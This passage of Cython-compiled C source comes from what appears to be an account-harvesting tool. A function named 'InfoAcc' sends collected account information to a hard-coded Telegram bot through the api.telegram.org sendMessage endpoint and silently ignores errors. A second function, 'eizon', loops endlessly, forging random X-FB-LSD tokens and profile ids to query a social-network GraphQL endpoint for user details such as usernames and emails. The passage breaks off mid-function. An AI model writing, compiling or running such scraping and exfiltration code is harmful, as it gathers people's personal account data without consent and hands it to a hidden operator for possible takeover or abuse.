        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_17);
        __pyx_L37_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_5) {
          __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__30, NULL);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 696, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        goto __pyx_L31;
      }
      __pyx_L31:;
    }
    goto __pyx_L41;
    __pyx_L28_error:;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L1_error;
    __pyx_L41:;
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_17, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_17);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_16, &__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_15);
        /*try:*/ {

          
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_requests); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 701, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 701, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __pyx_t_3 = PyTuple_New(7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_20 = 0;
          __pyx_t_21 = 127;
          __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
          __pyx_t_20 += 28;
          __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_https_api_telegram_org_bot);
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_token); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_21;
          __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
          __Pyx_GIVEREF(__pyx_t_2);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
          __pyx_t_2 = 0;
          __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);
          __pyx_t_20 += 21;
          __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);
          PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_sendMessage_chat_id);
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ID); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_21;
          __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
          __Pyx_GIVEREF(__pyx_t_1);
          PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_1);
          __pyx_t_1 = 0;
          __Pyx_INCREF(__pyx_kp_u_text_2);
          __pyx_t_20 += 6;
          __Pyx_GIVEREF(__pyx_kp_u_text_2);
          PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_text_2);
          __Pyx_INCREF(__pyx_v_tlg);
          __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_tlg) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_tlg) : __pyx_t_21;
          __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_tlg);
          __Pyx_GIVEREF(__pyx_v_tlg);
          PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_v_tlg);
          __Pyx_INCREF(__pyx_kp_u_parse_mode_HTML);
          __pyx_t_20 += 16;
          __Pyx_GIVEREF(__pyx_kp_u_parse_mode_HTML);
          PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_parse_mode_HTML);
          __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_3, 7, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 702, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_8, function);
            }
          }
          __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_1);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 701, __pyx_L48_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L53_try_end;
        __pyx_L48_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

        
        __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_10) {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L49_exception_handled;
        }
        goto __pyx_L50_except_error;
        __pyx_L50_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_16, __pyx_t_15);
        goto __pyx_L42_error;
        __pyx_L49_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_16, __pyx_t_15);
        __pyx_L53_try_end:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L47_try_end;
    __pyx_L42_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_10) {
      __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_8, &__pyx_t_1) < 0) __PYX_ERR(0, 705, __pyx_L44_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __pyx_v_e = __pyx_t_8;
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L60;
        }
        __pyx_L60:;
      }
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L43_exception_handled;
    }
    goto __pyx_L44_except_error;
    __pyx_L44_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_17);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_17, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L43_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_17);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_17, __pyx_t_7);
    __pyx_L47_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_rrr);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_v_Id);
  __Pyx_XDECREF(__pyx_v_fows);
  __Pyx_XDECREF(__pyx_v_fowg);
  __Pyx_XDECREF(__pyx_v_pp);
  __Pyx_XDECREF(__pyx_v_hy);
  __Pyx_XDECREF(__pyx_v_datte);
  __Pyx_XDECREF(__pyx_v_tlg);
  __Pyx_XDECREF(__pyx_v_ff);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_25eizon(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_25eizon = {"eizon", (PyCFunction)__pyx_pw_6source_25eizon, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_25eizon(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("eizon (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_24eizon(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_24eizon(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_emails = NULL;
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("eizon", 0);

  
  while (1) {

    
    __pyx_t_1 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 713, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choices); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 713, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_string); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 714, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_ascii_letters); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 714, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_string); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 715, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 715, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 714, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 713, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_2);
    __pyx_t_2 = 0;

    
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 716, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_k, __pyx_int_32) < 0) __PYX_ERR(0, 716, __pyx_L1_error)

    
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 713, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_2 = PyUnicode_Join(__pyx_kp_u__21, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_lsd, __pyx_t_2) < 0) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 717, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_dumps); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 717, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 719, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 720, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 720, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 720, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 719, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_id, __pyx_t_6) < 0) __PYX_ERR(0, 719, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_render_surface, __pyx_n_u_PROFILE) < 0) __PYX_ERR(0, 719, __pyx_L1_error)
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 717, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_variables, __pyx_t_2) < 0) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_doc_id, __pyx_kp_u_25618261841150840) < 0) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_1));
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 726, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 726, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 728, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 728, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_4 = __Pyx_PyDict_GetItem(__pyx_v_data, __pyx_n_u_lsd); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 728, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_X_FB_LSD, __pyx_t_4) < 0) __PYX_ERR(0, 728, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_t_5) < 0) __PYX_ERR(0, 728, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 728, __pyx_L1_error)

    
    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__55, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 726, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_5);
    __pyx_t_5 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_9);
      /*try:*/ {

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_u_data, __pyx_t_4};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_u_data, __pyx_t_4};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        } else
        #endif
        {
          __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          if (__pyx_t_3) {
            __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_3); __pyx_t_3 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_n_u_data);
          PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_t_4);
          PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_t_4);
          __pyx_t_4 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_11, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_11 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_2};
          __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
